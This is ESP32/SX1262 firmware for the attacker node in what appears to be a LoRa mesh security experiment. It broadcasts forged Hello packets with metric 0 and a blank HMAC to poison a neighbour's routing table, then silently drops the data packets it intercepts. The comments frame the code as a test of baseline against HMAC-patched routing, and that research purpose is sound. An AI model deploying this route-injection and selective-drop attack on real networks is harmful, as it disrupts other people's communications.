// E5b — Node C: ATTACKER
// Role   : Dolev-Yao attacker — broadcasts forged Hello with metric=1 to
//          poison Node A's routing table (claiming to be best path to gateway)
//          then drops all forwarded data packets (selective drop attack).
// Port   : /dev/cu.usbmodem134401  MAC: 1C:DB:D4:85:6C:E8
// Board  : Ebyte EoRa PI (ESP32-S3FH4R2 + E22-900MM22S / SX1262)
//
// ATTACK_MODE:
//   0 = passive (silent)
//   1 = ACTIVE  (route injection attack)

#define ATTACK_MODE      1
#define NODE_ID          0xCC
#define GATEWAY_ID       0xBB
#define ATTACK_PERIOD_MS 8000

#include "../e5b_common.h"

SPIClass spi(FSPI);
Module*  mod   = nullptr;
SX1262*  radio = nullptr;

volatile bool rxFlag = false;
void IRAM_ATTR onDio1() { rxFlag = true; }

uint16_t atk_seq     = 0;
uint32_t last_attack = 0;
uint32_t fwd_recv    = 0;

void send_forged_hello() {
  HelloMsg h;
  h.type   = MSG_HELLO;
  h.src    = NODE_ID;
  h.dst_gw = GATEWAY_ID;
  h.metric = 0;         // claim to BE the gateway (metric=0, same as real B)
  h.seq    = atk_seq++;
  memset(h.hmac, 0, HMAC_TAG_LEN);  // no valid HMAC
  radio->transmit((uint8_t*)&h, sizeof(h));
  radio->startReceive();
  Serial.printf("[ATK] Forged Hello seq=%u metric=0 (no HMAC)\n", atk_seq - 1);
  Serial.println("[ATK] → Baseline: Node A routes via attacker");
  Serial.println("[ATK] → Patched : Node A rejects (HMAC=0 invalid)");
}

void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n=== E5b Node C (ATTACKER) ===");
  Serial.printf("Attack mode: %s\n", ATTACK_MODE ? "ACTIVE" : "PASSIVE");

  eora_radio_init();
  spi.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_NSS);
  mod   = new Module(LORA_NSS, LORA_DIO1, LORA_RST, LORA_BUSY, spi);
  radio = new SX1262(mod);
  int st = radio->begin(LORA_FREQ, LORA_BW, LORA_SF, LORA_CR,
                        LORA_SYNC, LORA_POWER, 8, LORA_TCXO);
  if (st != RADIOLIB_ERR_NONE) {
    Serial.printf("[ERR] Radio init: %d\n", st);
    while (true) delay(1000);
  }
  radio->setDio1Action(onDio1);
  radio->startReceive();
  Serial.println("[RADIO] SX1262 ready @ 923 MHz AS923");
#if ATTACK_MODE
  // Send first attack immediately so it arrives before gateway's first Hello
  delay(100);
  send_forged_hello();
  last_attack = millis();
#endif
}

void loop() {
  uint32_t now = millis();

#if ATTACK_MODE
  if (now - last_attack >= ATTACK_PERIOD_MS) {
    last_attack = now;
    send_forged_hello();
  }
#endif

  if (rxFlag) {
    rxFlag = false;
    uint8_t buf[256];
    size_t pkt_len = radio->getPacketLength();
    int state = radio->readData(buf, sizeof(buf));
    radio->startReceive();

    if (state == RADIOLIB_ERR_NONE && pkt_len > 0) {
      int len = (int)pkt_len;
      if (buf[0] == MSG_DATA) {
        DataMsg *d = (DataMsg*)buf;
        fwd_recv++;
        Serial.printf("[DROP] Intercepted DATA id=%u src=0x%02X dst=0x%02X "
                      "| total=%lu\n",
                      d->pkt_id, d->src, d->dst, fwd_recv);
      }
      else if (buf[0] == MSG_HELLO) {
        HelloMsg *h = (HelloMsg*)buf;
        Serial.printf("[SNIFF] Hello from 0x%02X metric=%u\n",
                      h->src, h->metric);
      }
    }
  }
}
